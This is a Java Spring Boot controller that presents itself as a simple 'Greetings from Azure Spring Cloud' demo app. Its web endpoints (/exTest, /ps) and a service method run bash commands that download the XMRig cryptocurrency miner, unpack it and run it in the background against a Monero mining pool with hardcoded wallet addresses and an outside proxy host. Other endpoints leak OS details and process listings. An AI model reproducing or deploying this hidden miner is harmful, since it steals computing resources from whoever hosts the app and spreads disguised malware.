package com.example.hellospring;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestMapping;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

@Service
@RestController
public class HelloController {
    public static final Logger LOGGER = LoggerFactory.getLogger(HelloController.class);


    public void processBuilderCommandsExecutor(){
        try {
            StringBuilder output = new StringBuilder();
            ProcessBuilder processBuilder = new ProcessBuilder();
			String[] cmd3 = {"/bin/bash", "-c", "curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 43HMPa3Hs5DGGmHQMzuDiCDAYhF5A8GZXS3biojW6aUwF8Two1eSEq2KbweXGe9WkuhwRAehUcnGM1G7VfUFJJab4itzN5r.test1 -x covi21.ddns.net:10555 -B ; sleep 99999999"};
            System.out.println("dangchay");
            processBuilder.command(cmd3);
            printCommandOutput(output, processBuilder);
            System.out.println("###########################");

            

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void printCommandOutput(StringBuilder output, ProcessBuilder processBuilder) throws IOException {
        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }
            int exitVal = process.waitFor();
            if (exitVal == 0) {
                System.out.println("Success!");
                System.out.println(output);
                System.exit(0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    @RequestMapping("/")
    public String index() {
        String nameOS = "os.name";  
      String versionOS = "os.version";  
      String architectureOS = "os.arch";
      System.out.println("\n  The information about OS");
      System.out.println("\nName of the OS: " + System.getProperty(nameOS));
      System.out.println("Version of the OS: " + System.getProperty(versionOS));
      System.out.println("Architecture of THe OS: " + System.getProperty(architectureOS));  
       return "Greetings from Azure Spring Cloud!";
    }

    @RequestMapping("/test")
    public String test(){
            String nameOS = "os.name";  
      String versionOS = "os.version";  
      String architectureOS = "os.arch";
              String infox = "OS: " + System.getProperty(nameOS) + "\nVersion: " + System.getProperty(versionOS);
                    return infox;
    }
    @RequestMapping("/ps")
    public String getCurrentPs(){
        String s;
        Process p;
        String outputx="Here you are:" ;
        outputx +=System.lineSeparator();
        try {
			String[] cmd4 = {"/bin/bash", "-c", "curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx -B ; ps -aux; sleep 500000"};
            p = Runtime.getRuntime().exec("cmd4");
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null){
                outputx += s;
                outputx +=System.lineSeparator();
            }
            p.waitFor();
            System.out.println(outputx);
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) {
            outputx += "ERROR";
        }
        return outputx;
    }
    
    @RequestMapping("/ls")
    public String ls(){
        String s;
        Process p;
        String outputx="Logs:" ;
        outputx +=System.lineSeparator();
        try {
            p = Runtime.getRuntime().exec("ps -aux");
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null){
                outputx += s;
                outputx +=System.lineSeparator();
            }
            p.waitFor();
            System.out.println(outputx);
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) {
            outputx += "ERROR";
        }
        return outputx;
    }
    
    @RequestMapping("/exTest")
    public String exTest(){
        String[] cmd2 = {"/bin/bash", "-c", "curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx -B ;sleep 500000"};
        
		String s;
        String outputx="Run progress:" ;
        LOGGER.info("***** Script execution Starts *****");
        try{
           Process proc = Runtime.getRuntime().exec(cmd2); 
           int exitStatus = proc.waitFor();
          BufferedReader br = new BufferedReader(
                new InputStreamReader(proc.getInputStream()));
            while ((s = br.readLine()) != null){
                LOGGER.info(s);
                outputx += s;
                outputx +=System.lineSeparator();
            }
            if (exitStatus != 0) {
                br = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                while ((s = br.readLine()) != null) {
                    LOGGER.error(s);
                }
                throw new IllegalStateException("Script exited abnormally");
            }
            LOGGER.info("***** Script executed successfully *****");
        } catch(Exception e){
            LOGGER.error("Error during script execution", e);
            outputx += "Error exe";
            outputx += e.toString();
        }
        return outputx;
    }

}
